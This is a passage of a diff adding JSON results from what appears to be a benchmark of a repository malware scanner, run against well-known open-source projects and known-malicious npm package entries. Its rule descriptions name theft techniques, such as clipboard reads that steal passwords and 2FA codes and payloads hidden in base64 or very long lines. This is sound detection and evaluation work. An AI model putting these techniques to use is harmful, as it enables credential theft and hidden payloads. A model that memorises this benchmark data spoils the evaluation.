+        "OBF_EVAL",
+        "EXFIL_CLIPBOARD",
+        "OBF_SETTIMEOUT_STRING"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/puppeteer-core/src/api/ElementHandle.ts",
+          "line": 463,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/puppeteer-core/src/api/Frame.ts",
+          "line": 624,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "EXFIL_CLIPBOARD",
+          "file": "packages/puppeteer-core/src/api/Input.ts",
+          "line": 333,
+          "description": "Reads clipboard content — can steal copied passwords, 2FA codes, crypto addresses"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "packages/puppeteer-core/src/api/Page.ts",
+          "line": 1353,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_SETTIMEOUT_STRING",
+          "file": "packages/puppeteer-core/src/api/locators/locators.ts",
+          "line": null,
+          "description": "Passing a string to setTimeout/setInterval executes it as code (like eval). A common obfuscation technique: setTimeout(\"maliciousCode()\", 0)\n"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 2016,
+      "treeTruncated": false,
+      "durationMs": 3726,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-microsoft-typescript",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/microsoft/TypeScript",
+      "immutableRef": "637d5746b70257028fb95aad32ddec6b26ab0a14",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.075,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "OBFUSCATED_CODE",
+        "OBF_EVAL",
+        "OBF_NEW_FUNCTION",
+        "NETWORK_COMMUNICATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/commandLineParser.ts",
+          "line": 1941,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/moduleNameResolver.ts",
+          "line": 79,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/parser.ts",
+          "line": 1042,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/program.ts",
+          "line": 227,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/resolutionCache.ts",
+          "line": 67,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "src/compiler/scanner.ts",
+          "line": 333,
+          "description": "Extremely long line detected (10,367 characters). Malicious code may be hidden far to the right. Affected: Line 333 (5,355 chars), Line 342 (8,908 chars), Line 344 (10,367 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/transformers/classFields.ts",
+          "line": 1846,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/transformers/destructuring.ts",
+          "line": 142,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/transformers/es2015.ts",
+          "line": 571,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/types.ts",
+          "line": 4730,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/utilities.ts",
+          "line": 509,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/compiler/watchPublic.ts",
+          "line": 75,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "src/harness/fourslashImpl.ts",
+          "line": 785,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "src/harness/fourslashImpl.ts",
+          "line": 791,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_EVAL",
+          "file": "src/harness/fourslashInterfaceImpl.ts",
+          "line": 331,
+          "description": "eval() executes arbitrary dynamic code. While there are legitimate uses, eval() is the #1 technique for executing hidden malicious payloads.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "src/compiler/transformers/es2015.ts",
+          "line": 3702,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (2 occurrences)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "src/compiler/utilities.ts",
+          "line": 6201,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 53109,
+      "treeTruncated": true,
+      "durationMs": 9514,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-npm-cli",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/npm/cli",
+      "immutableRef": "7b1f6c173d17b3bf30e45426f6df39473c6a1163",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.09,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "HARDCODED_SECRETS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "lib/commands/profile.js",
+          "line": null,
+          "description": "Hardcoded credentials detected: Password"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "lib/utils/auth.js",
+          "line": null,
+          "description": "Hardcoded credentials detected: Password"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "lib/utils/read-user-info.js",
+          "line": null,
+          "description": "Hardcoded credentials detected: Password"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 6701,
+      "treeTruncated": false,
+      "durationMs": 4126,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-homebrew-brew",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/Homebrew/brew",
+      "immutableRef": "76ca8d74e4a180badad438bf245ddfc740d68a8e",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.09,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "SUSPICIOUS_FILE_ACCESS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "Library/Homebrew/brew.sh",
+          "line": 860,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 2970,
+      "treeTruncated": false,
+      "durationMs": 3564,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-python-cpython",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/python/cpython",
+      "immutableRef": "1fece4457032382947c7c2a5c9e95dc106ca7a7d",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.165,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "OBF_NEW_FUNCTION",
+        "OBFUSCATED_CODE",
+        "OBF_HEX_STRINGS",
+        "DATA_EXFILTRATION",
+        "NETWORK_COMMUNICATION",
+        "CODE_INTEGRITY_ISSUE"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "Doc/_static/tachyon-example-flamegraph.html",
+          "line": 9,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_NEW_FUNCTION",
+          "file": "Doc/_static/tachyon-example-flamegraph.html",
+          "line": 9,
+          "description": "new Function() creates and executes dynamic code similar to eval(). Used to hide malicious logic that bypasses some static analysis tools.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "Doc/_static/tachyon-example-flamegraph.html",
+          "line": 9,
+          "description": "Extremely long line detected (279,572 characters). Contains suspicious code patterns like eval/exec/fetch. Malicious code may be hidden far to the right. Affected: Line 9 (279,572 chars, contains suspicious code), Line 61 (58,594 chars, contains suspicious code), Line 64 (37,721 chars, contains suspicious code)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "OBFUSCATED_CODE",
+          "rule": "OBFUSCATED_CODE",
+          "file": "Doc/_static/tachyon-example-heatmap.html",
+          "line": 1993,
+          "description": "Extremely long line detected (199,608 characters). Malicious code may be hidden far to the right. Affected: Line 1993 (199,608 chars)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "Lib/_colorize.py",
+          "line": 16,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "Lib/_pyrepl/terminfo.py",
+          "line": 125,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "Lib/_pyrepl/windows_console.py",
+          "line": 116,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_HEX_STRINGS",
+          "file": "Lib/_pyrepl/windows_eventqueue.py",
+          "line": 10,
+          "description": "20+ hex escape sequences (\\xNN) in a single file. Hex encoding hides the actual string content from developers, often used to conceal URLs, commands, or shellcode.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "Doc/_static/tachyon-example-flamegraph.html",
+          "line": 2518,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "Lib/_aix_support.py",
+          "line": 45,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "Lib/_pyrepl/windows_console.py",
+          "line": 173,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "CODE_INTEGRITY_ISSUE",
+          "rule": "CODE_INTEGRITY_ISSUE",
+          "file": "Doc/_static/tachyon-example-flamegraph.html",
+          "line": null,
+          "description": "Minified/obfuscated code detected in source repository"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 5803,
+      "treeTruncated": false,
+      "durationMs": 10282,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-django-django",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/django/django",
+      "immutableRef": "bdbda29c3e126754c3ae04ceb5c5d35d49aae01c",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 6874,
+      "treeTruncated": false,
+      "durationMs": 3997,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-ansible-ansible",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/ansible/ansible",
+      "immutableRef": "8d63341579aa1c62024f3bce1a8af3f9a1b22a16",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.1275,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "NETWORK_COMMUNICATION",
+        "HARDCODED_SECRETS"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "lib/ansible/_internal/_powershell/_clixml.py",
+          "line": 182,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (1 occurrence)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "HARDCODED_SECRETS",
+          "rule": "HARDCODED_SECRETS",
+          "file": "lib/ansible/cli/__init__.py",
+          "line": null,
+          "description": "Hardcoded credentials detected: Password"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 5591,
+      "treeTruncated": false,
+      "durationMs": 4048,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-scrapy-scrapy",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/scrapy/scrapy",
+      "immutableRef": "c9446931a80e63ea1d77e130ea5581b547e0f51b",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 432,
+      "treeTruncated": false,
+      "durationMs": 3222,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-pallets-flask",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/pallets/flask",
+      "immutableRef": "36e4a824f340fdee7ed50937ba8e7f6bc7d17f81",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 107,
+      "filesSkipped": 129,
+      "treeTruncated": false,
+      "durationMs": 2986,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-rust-lang-rust",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/rust-lang/rust",
+      "immutableRef": "5503df87342a73d0c29126a7e08dc9c1255c46ad",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0.2025,
+      "safeToClone": true,
+      "rulesTriggered": [
+        "OBF_BASE64_HEAVY",
+        "SUSPICIOUS_FILE_ACCESS",
+        "NETWORK_COMMUNICATION",
+        "DATA_EXFILTRATION"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "MALWARE_SIGNATURE",
+          "rule": "OBF_BASE64_HEAVY",
+          "file": "src/ci/docker/host-x86_64/dist-x86_64-netbsd/build-netbsd-toolchain.sh",
+          "line": 45,
+          "description": "6+ base64 strings of 50+ chars in a single file. Base64 is a legitimate encoding, but excessive use in source code is a red flag — it's the most common way to hide malicious payloads, C2 URLs, and commands from static analysis.\n"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "compiler/rustc_codegen_cranelift/.github/scripts/free-disk-space.sh",
+          "line": 238,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "src/ci/docker/scripts/illumos-toolchain.sh",
+          "line": 85,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "NETWORK_COMMUNICATION",
+          "rule": "NETWORK_COMMUNICATION",
+          "file": "src/ci/docker/scripts/ohos-sdk.sh",
+          "line": 6,
+          "description": "Suspicious network communication detected: Hardcoded IP Address (3 occurrences)"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "src/ci/docker/scripts/solaris-toolchain.sh",
+          "line": 112,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "src/ci/scripts/free-disk-space-linux.sh",
+          "line": 313,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "medium",
+          "type": "SUSPICIOUS_FILE_ACCESS",
+          "rule": "SUSPICIOUS_FILE_ACCESS",
+          "file": "src/ci/scripts/install-clang.sh",
+          "line": 53,
+          "description": "Suspicious file access detected: Destructive File Deletion"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "src/librustdoc/html/static/js/main.js",
+          "line": 459,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "src/librustdoc/html/static/js/search.js",
+          "line": 5406,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        },
+        {
+          "severity": "medium",
+          "confidence": "low",
+          "type": "DATA_EXFILTRATION",
+          "rule": "DATA_EXFILTRATION",
+          "file": "src/tools/clippy/util/gh-pages/script.js",
+          "line": 341,
+          "description": "Data exfiltration patterns detected: Form Data Access"
+        }
+      ],
+      "filesScanned": 200,
+      "filesSkipped": 60050,
+      "treeTruncated": true,
+      "durationMs": 7390,
+      "error": ""
+    },
+    {
+      "sampleId": "noisy-golang-go",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/golang/go",
+      "immutableRef": "03845e30f7b73d1703bd8c21017297f6eecb76d6",
+      "expectedDetectionCategories": [],
+      "minimumExpectedVerdict": "",
+      "maximumExpectedVerdict": "low",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "low",
+      "actualScore": 0,
+      "safeToClone": true,
+      "rulesTriggered": [],
+      "falsePositiveNotes": "",
+      "findings": [],
+      "filesScanned": 200,
+      "filesSkipped": 15414,
+      "treeTruncated": false,
+      "durationMs": 5058,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2024-8862",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2024-8862; report blob cebceb18d12edabb3bf055a6936a367b0614e792",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/bcrypts-js/MAL-2024-8862.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:cebceb18d12edabb3bf055a6936a367b0614e792:7c7ee68d6f6b26b48726c11558dc9206bf998cf9",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: bcrypts-js"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2024-1377",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2024-1377; report blob c78863fed3a5a3b662b72b05c16b77d9dc153665",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/cors-parser/MAL-2024-1377.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:c78863fed3a5a3b662b72b05c16b77d9dc153665:3e4eb5c422572ea85c1fff43d7e1f202899068b3",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.4,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "critical",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: cors-parser"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-19413",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-19413; report blob 84b9fce13d64dd7ec790910850e9fbbbf58cf348",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/electorn/MAL-2025-19413.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:84b9fce13d64dd7ec790910850e9fbbbf58cf348:d511c4332bf47892ca7bf08a3ad5e06ccc7224fb",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: electorn"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 1,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-20690",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
